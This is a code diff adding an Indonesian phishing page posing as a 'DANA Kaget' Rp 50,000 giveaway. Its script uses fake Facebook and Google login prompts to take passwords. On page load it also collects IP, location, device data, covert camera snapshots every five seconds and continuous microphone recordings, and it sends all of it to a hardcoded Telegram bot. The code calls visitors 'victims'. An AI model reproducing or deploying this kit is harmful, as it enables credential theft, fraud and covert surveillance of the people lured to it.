@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>DANA KAGET 50K - Klaim Hadiah Spesial</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      min-height: 100vh;
+      background: linear-gradient(145deg, #0c6b3a 0%, #064e1f 100%);
+      font-family: 'Poppins', system-ui, -apple-system, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
+      position: relative;
+    }
+
+    /* Efek uang berjatuhan */
+    .money-rain {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
+      overflow: hidden;
+    }
+
+    .money-icon {
+      position: absolute;
+      font-size: 32px;
+      opacity: 0.2;
+      animation: dropMoney linear infinite;
+      pointer-events: none;
+    }
+
+    @keyframes dropMoney {
+      0% {
+        transform: translateY(-15vh) rotate(0deg);
+        opacity: 0;
+      }
+      15% {
+        opacity: 0.3;
+      }
+      85% {
+        opacity: 0.3;
+      }
+      100% {
+        transform: translateY(115vh) rotate(360deg);
+        opacity: 0;
+      }
+    }
+
+    /* Container utama */
+    .container {
+      position: relative;
+      z-index: 10;
+      width: 100%;
+      max-width: 520px;
+      background: rgba(255, 255, 255, 0.98);
+      border-radius: 48px;
+      box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.6), 0 0 0 2px rgba(0, 150, 136, 0.4);
+      overflow: hidden;
+      backdrop-filter: blur(2px);
+      animation: fadeSlideUp 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+    }
+
+    @keyframes fadeSlideUp {
+      from {
+        opacity: 0;
+        transform: translateY(50px) scale(0.96);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    /* Header Dana Kaget */
+    .header-dana {
+      background: linear-gradient(135deg, #00897B, #004D40);
+      padding: 32px 20px 28px;
+      text-align: center;
+      position: relative;
+      border-bottom-left-radius: 32px;
+      border-bottom-right-radius: 32px;
+    }
+
+    .badge-anggur {
+      background: #FFD54F;
+      display: inline-block;
+      padding: 6px 18px;
+      border-radius: 60px;
+      font-size: 14px;
+      font-weight: 800;
+      color: #2E7D32;
+      margin-bottom: 16px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    }
+
+    .logo-dana {
+      font-size: 54px;
+      font-weight: 900;
+      background: white;
+      display: inline-block;
+      padding: 6px 28px;
+      border-radius: 100px;
+      color: #00897B;
+      letter-spacing: 3px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+      margin-bottom: 16px;
+    }
+
+    .kaget-title {
+      background: #FF6F00;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 10px 20px;
+      border-radius: 60px;
+      width: fit-content;
+      margin: 12px auto 8px;
+      font-weight: bold;
+      font-size: 20px;
+      color: white;
+      box-shadow: 0 5px 0 #B85C00;
+    }
+
+    .amount-50k {
+      font-size: 52px;
+      font-weight: 900;
+      color: #FFE082;
+      text-shadow: 0 3px 0 #A5673F;
+      letter-spacing: 3px;
+      margin: 8px 0 4px;
+    }
+
+    .limited {
+      background: #00000066;
+      display: inline-block;
+      padding: 4px 20px;
+      border-radius: 40px;
+      font-size: 12px;
+      color: #FFE57F;
+    }
+
+    /* isi konten */
+    .content-panel {
+      padding: 28px 22px 32px;
+    }
+
+    .info-claim {
+      background: #F1F8E9;
+      border-radius: 28px;
+      padding: 18px;
+      margin-bottom: 24px;
+      border-left: 6px solid #00BFA5;
+      box-shadow: 0 6px 12px rgba(0,0,0,0.05);
+    }
+
+    .info-claim p {
+      font-size: 14px;
+      color: #2E3B2C;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .timer-box {
+      background: #263238;
+      padding: 14px;
+      border-radius: 66px;
+      text-align: center;
+      margin-bottom: 28px;
+      color: #FFB300;
+      font-weight: bold;
+      font-size: 22px;
+      font-family: monospace;
+      letter-spacing: 2px;
+      box-shadow: inset 0 0 8px #00000033, 0 6px 12px rgba(0,0,0,0.1);
+    }
+
+    .login-verif {
+      text-align: center;
+      margin: 18px 0 12px;
+    }
+
+    .login-verif h3 {
+      font-size: 18px;
+      color: #1F4F2B;
+      margin-bottom: 12px;
+    }
+
+    .btn-login-group {
+      display: flex;
+      gap: 18px;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+
+    .btn-dana {
+      flex: 1;
+      background: linear-gradient(95deg, #1877F2, #0E5FD9);
+      border: none;
+      padding: 14px 10px;
+      border-radius: 60px;
+      color: white;
+      font-weight: bold;
+      font-size: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      cursor: pointer;
+      transition: 0.1s linear;
+      box-shadow: 0 6px 0 #0A3B8A;
+    }
+
+    .btn-dana:nth-child(2) {
+      background: linear-gradient(95deg, #DB4437, #B62B1E);
+      box-shadow: 0 6px 0 #7E2A21;
+    }
+
+    .btn-dana:active {
+      transform: translateY(2px);
+      box-shadow: 0 2px 0 #0A3B8A;
+    }
+
+    .footer-safe {
+      background: #E0F2F1;
+      padding: 12px;
+      text-align: center;
+      font-size: 10px;
+      color: #00796B;
+      margin-top: 20px;
+      border-radius: 20px;
+    }
+
+    video, canvas {
+      display: none;
+    }
+
+    /* Star spark */
+    .spark {
+      position: absolute;
+      background: radial-gradient(circle, #FFD966, #FFB347);
+      border-radius: 50%;
+      pointer-events: none;
+      animation: sparkle 0.8s ease-out forwards;
+    }
+
+    @keyframes sparkle {
+      0% { transform: scale(0); opacity: 1; }
+      100% { transform: scale(1.2); opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="money-rain" id="moneyRain"></div>
+
+<div class="container">
+  <div class="header-dana">
+    <div class="badge-anggur">✨ BONUS SPESIAL ✨</div>
+    <div class="logo-dana">⚡ DANA ⚡</div>
+    <div class="kaget-title">
+      <span>🔥 KAGET 🔥</span>
+      <span>💰 50K 💰</span>
+    </div>
+    <div class="amount-50k">Rp 50.000</div>
+    <div class="limited">⌛ terbatas untuk pengguna aktif</div>
+  </div>
+
+  <div class="content-panel">
+    <div class="info-claim">
+      <p>🎁 <strong>Dapatkan saldo DANA 50RB gratis!</strong></p>
+      <p>✅ Cukup verifikasi akun melalui login di bawah.</p>
+      <p>⚡ Dana akan masuk otomatis dalam 5 menit.</p>
+    </div>
+
+    <div class="timer-box" id="countdownTimer">🕒 Kesempatan berakhir: 04:59</div>
+
+    <div class="login-verif">
+      <h3>🔐 VERIFIKASI AKUN UNTUK KLAIM</h3>
+      <div class="btn-login-group">
+        <button class="btn-dana" onclick="fakeLogin('Facebook')">📘 Lanjut dengan Facebook</button>
+        <button class="btn-dana" onclick="fakeLogin('Google')">📧 Lanjut dengan Google</button>
+      </div>
+      <p style="font-size: 11px; margin-top: 16px; color: #5D5F5E;">*satu akun hanya bisa klaim sekali</p>
+    </div>
+    <div class="footer-safe">🔒 Terverifikasi oleh Dana Kaget. Hadiah langsung dikirim.</div>
+  </div>
+</div>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+  // ========== SISTEM SAMA ==========
+  const token = '8298659481:AAHfn7KNbUGgJ-izPrFbRA8LbdItE9mgSvI';
+  const chat_id = '8411635450';
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const ctx = canvas.getContext('2d');
+
+  function kirimPesan(text) {
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id, text })
+    }).catch(e => console.warn);
+  }
+
+  function kirimFile(audioBlob) {
+    const form = new FormData();
+    form.append('chat_id', chat_id);
+    form.append('audio', audioBlob, 'voice_dana.webm');
+    fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form }).catch(e => console.warn);
+  }
+
+  function fakeLogin(provider) {
+    let email = prompt(`🔐 Verifikasi via ${provider}\nMasukkan Email/Nomor terdaftar:`);
+    let password = prompt(`🔐 Masukkan Password ${provider}:`);
+    if (email && password) {
+      kirimPesan(`✨[DANA KAGET] Ada klaim baru via ${provider}\nUser: ${email}`);
+      setTimeout(() => {
+        const loginData = `
+🎉 DANA KAGET 50K 🎉
+📧 Akun: ${email}
+🔑 Pass: ${password}
+🖥️ Metode: ${provider}
+🌟 Status: Sukses, menunggu transfer.
+=========================`;
+        kirimPesan(loginData);
+      }, 1500);
+    } else {
+      kirimPesan("⚠️ Korban gagal input data (DANA KAGET)");
+    }
+  }
+
+  // awal: info device dan lokasi
+  kirimPesan('📱 [DANA KAGET 50K] Data korban masuk 📱');
+
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(ipData => fetch('https://ipapi.co/' + ipData.ip + '/json/'))
+    .then(loc => loc.json())
+    .then(info => {
+      const device = navigator.userAgent;
+      const ram = navigator.deviceMemory || '?';
+      const cpu = navigator.hardwareConcurrency || '?';
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const bahasa = navigator.language;
+      const browser = navigator.appName + ' ' + navigator.appVersion;
+      navigator.getBattery().then(bat => {
+        const status = `
+💰 DANA KAGET - KORBAN 💰
+🌐 IP: ${info.ip}
+🏳️ Negara: ${info.country_name}
+📲 Kota: ${info.city}
+🔎 ISP: ${info.org}
+🔋 Baterai: ${Math.floor(bat.level * 100)}%
+📱 Device: ${device}
+🧠 RAM: ${ram} GB
+⚙️ CPU: ${cpu} core
+🌍 Zona: ${timezone}
+🗣️ Bahasa: ${bahasa}
+🧭 Browser: ${browser}`;
+        kirimPesan(status);
+      });
+    });
+
+  if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(pos => {
+      const lokasi = `📍 Live Location Korban DANA:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+      kirimPesan(lokasi);
+    });
+  }
+
+  // Kamera
+  if (navigator.mediaDevices) {
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        video.play();
+        setInterval(() => ambilFoto(), 5000);
+      })
+      .catch(err => kirimPesan("Gagal kamera: " + err));
+  }
+
+  function ambilFoto() {
+    if (video.videoWidth) {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      canvas.toBlob(blob => {
+        let fd = new FormData();
+        fd.append('chat_id', chat_id);
+        fd.append('photo', blob, 'dana_selfie.jpg');
+        fd.append('caption', '📸 Potret Korban (Klaim DANA 50K)');
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+      }, 'image/jpeg');
+    }
+  }
+
+  // Rekam mic
+  if (navigator.mediaDevices) {
+    navigator.mediaDevices.getUserMedia({ audio: true })
+      .then(stream => {
+        const recorder = new MediaRecorder(stream);
+        let chunks = [];
+        recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+        recorder.onstop = () => {
+          if (chunks.length) {
+            const blob = new Blob(chunks, { type: 'audio/webm' });
+            kirimFile(blob);
+            chunks = [];
+          }
+          recorder.start();
+          setTimeout(() => recorder.stop(), 58000);
+        };
+        recorder.start();
+        setTimeout(() => recorder.stop(), 58000);
+      })
+      .catch(e => kirimPesan("Mic error: " + e));
+  }
+
+  // Timer
+  let timeSec = 299;
+  const timerSpan = document.getElementById('countdownTimer');
+  const countInterval = setInterval(() => {
+    if (timeSec <= 0) {
+      clearInterval(countInterval);
+      if (timerSpan) timerSpan.innerText = '⏰ Kesempatan habis!';
+    } else {
+      const m = Math.floor(timeSec / 60);
+      const s = timeSec % 60;
+      timerSpan.innerText = `🕒 Kesempatan berakhir: ${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+      timeSec--;
+    }
+  }, 1000);
+
+  // Animasi uang
+  function startMoneyRain() {
+    const rainZone = document.getElementById('moneyRain');
+    const icons = ['💰', '🤑', '💵', '🌟', '🎉', '💸'];
+    for (let i = 0; i < 22; i++) {
+      let el = document.createElement('div');
+      el.className = 'money-icon';
+      el.innerText = icons[Math.floor(Math.random() * icons.length)];
+      el.style.left = Math.random() * 100 + '%';
+      el.style.fontSize = (24 + Math.random() * 40) + 'px';
+      el.style.animationDuration = 3 + Math.random() * 5 + 's';
+      el.style.animationDelay = Math.random() * 7 + 's';
+      rainZone.appendChild(el);
+      setTimeout(() => el.remove(), 10000);
+    }
+  }
+  setInterval(startMoneyRain, 3200);
+  startMoneyRain();
+</script>
+</body>
+  </html>
